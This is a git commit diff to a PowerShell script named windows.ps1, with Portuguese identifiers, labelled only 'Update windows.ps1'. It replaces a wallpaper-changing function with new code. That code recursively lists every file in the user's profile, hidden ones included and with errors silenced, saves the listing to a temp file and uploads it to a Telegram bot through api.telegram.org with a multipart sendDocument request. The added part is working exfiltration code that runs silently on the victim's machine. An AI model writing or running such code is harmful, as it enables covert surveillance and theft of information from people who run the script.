5b82134eb467ecb85bbde33582a917a98939e235
Miguel Santos <miguelsantos029@gmail.com>
2025-08-22 14:54:45 +0100

    Update windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -1,4 +1,4 @@
-#4
+#3
 
 $ComputerName = $env:COMPUTERNAME
 $UserName = $env:USERNAME
@@ -25,70 +25,40 @@ $msg = "A executar script em $ComputerName - $UserName"
 
 
 
-Function Set-WallPaper {
- 
-param (
-    [parameter(Mandatory=$True)]
-    # Provide path to image
-    [string]$Image,
-    # Provide wallpaper style that you would like applied
-    [parameter(Mandatory=$False)]
-    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
-    [string]$Style
-)
- 
-$WallpaperStyle = Switch ($Style) {
-  
-    "Fill" {"10"}
-    "Fit" {"6"}
-    "Stretch" {"2"}
-    "Tile" {"0"}
-    "Center" {"0"}
-    "Span" {"22"}
-  
-}
- 
-If($Style -eq "Tile") {
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
- 
-}
-Else {
- 
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
- 
-}
- 
-Add-Type -TypeDefinition @" 
-using System; 
-using System.Runtime.InteropServices;
-  
-public class Params
-{ 
-    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
-    public static extern int SystemParametersInfo (Int32 uAction, 
-                                                   Int32 uParam, 
-                                                   String lpvParam, 
-                                                   Int32 fuWinIni);
-}
-"@ 
-  
-    $SPI_SETDESKWALLPAPER = 0x0014
-    $UpdateIniFile = 0x01
-    $SendChangeEvent = 0x02
-  
-    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
-  
-    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
-}
+$botToken = "$token"
+$chatId   = "$chatId"
 
+$diretorio = [Environment]::GetFolderPath("UserProfile")
 
-#Invoke-WebRequest -Uri $image -OutFile $env:TMP\i.png
-#Set-WallPaper -Image "$env:TMP\i.png" -Style Center
+$listagem = Get-ChildItem -Recurse -Force -Path $diretorio -ErrorAction SilentlyContinue |
+    Select-Object FullName,
+                  @{Name="Tamanho(KB)"; Expression={[math]::Round($_.Length / 1KB, 2)}},
+                  @{Name="DataModificacao"; Expression={$_.LastWriteTime}} |
+    Out-String
+
+$ficheiroSaida = "$env:TEMP\listagem_usuario.txt"
+$listagem | Out-File -FilePath $ficheiroSaida -Encoding UTF8
+
+# Envio do ficheiro (compatível com PowerShell antigo)
+$boundary = [System.Guid]::NewGuid().ToString()
+$LF = "`r`n"
+$bodyLines = @()
+$bodyLines += "--$boundary$LF"
+$bodyLines += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$chatId$LF"
+$bodyLines += "--$boundary$LF"
+$bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$($ficheiroSaida | Split-Path -Leaf)`"$LF"
+$bodyLines += "Content-Type: application/octet-stream$LF$LF"
+$bodyLines += [System.IO.File]::ReadAllText($ficheiroSaida)
+$bodyLines += "$LF--$boundary--$LF"
+$body = $bodyLines -join ""
+
+Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendDocument" `
+                  -Method Post `
+                  -ContentType "multipart/form-data; boundary=$boundary" `
+                  -Body $body
 
 exit
+
 
 
 
